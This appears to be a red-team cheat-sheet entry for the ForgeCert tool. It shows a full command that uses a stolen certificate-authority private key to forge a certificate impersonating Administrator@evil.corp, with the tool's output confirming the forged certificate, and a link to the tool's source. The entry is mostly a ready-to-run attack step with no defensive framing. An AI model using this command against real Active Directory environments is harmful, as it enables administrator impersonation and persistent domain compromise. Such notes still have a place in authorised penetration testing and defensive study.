# ForgeCert

## [[Forged Certificates]]
Generate certificate with stolen pk
```beacon
C:\Users\Administrator\Desktop>C:\Tools\ForgeCert\ForgeCert\bin\Debug\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "password" --Subject "CN=User" --SubjectAltName "Administrator@evil.corp" --NewCertPath fake.pfx --NewCertPassword "password"
CA Certificate Information:
  Subject:        CN=ca-1, DC=evil, DC=corp
  Issuer:         CN=ca-1, DC=evil, DC=corp
  Start Date:     2/25/2022 11:29:14 AM
  End Date:       2/25/2047 11:39:08 AM
  Thumbprint:     7F8A1EFB7A50E2D1DE098085301926AA13AE0A71
  Serial:         31AC83C6678F28994CFB58207C9FB668

Forged Certificate Information:
  Subject:        CN=User
  SubjectAltName: Administrator@evil.corp
  Issuer:         CN=ca-1, DC=evil, DC=corp
  Start Date:     3/1/2022 2:19:20 PM
  End Date:       3/1/2023 2:19:20 PM
  Thumbprint:     73C45EC22357C0451E0F374AC30B5C6F6034B132
  Serial:         009E1C0AE8A247695199F8157DB37E38AD

Done. Saved forged certificate to fake.pfx with the password 'password'
```

```meta
requirements: 
results: 
oss: #win
source: https://github.com/GhostPack/ForgeCert
description: Generate certs
```